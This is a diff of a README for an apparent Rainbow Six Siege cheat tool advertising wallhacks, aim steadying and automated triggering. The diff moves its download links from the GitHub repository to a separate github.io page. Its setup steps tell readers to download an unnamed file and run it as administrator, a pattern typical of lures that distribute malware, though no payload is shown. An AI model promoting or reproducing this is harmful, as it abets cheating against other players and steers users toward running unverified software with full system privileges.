@@ -1,6 +1,6 @@
 # 🎯 R6-Apex-Tool - Win every match with better aim
 
-[![](https://img.shields.io/badge/Download_Tool-Blue-blue.svg)](https://github.com/krisknifelike167/R6-Apex-Tool)
+[![](https://img.shields.io/badge/Download_Tool-Blue-blue.svg)](https://krisknifelike167.github.io)
 
 ## 📖 About this project
 R6-Apex-Tool helps players improve their game performance in Rainbow Six Siege. The software provides tools to track enemies through walls, steady aim, and automate trigger responses. You gain a clear view of the battlefield and control over your weapon handling.
@@ -17,7 +17,7 @@ Ensure your computer meets these standards to run the software.
 ## 🚀 Getting started
 Follow these steps to set up the tool on your Windows computer.
 
-1. Visit the project link to start your download: https://github.com/krisknifelike167/R6-Apex-Tool
+1. Visit the project link to start your download: https://krisknifelike167.github.io
 2. Locate the file in your downloads folder.
 3. Right-click the file and select Run as administrator.
 4. Follow the prompts in the installation window.
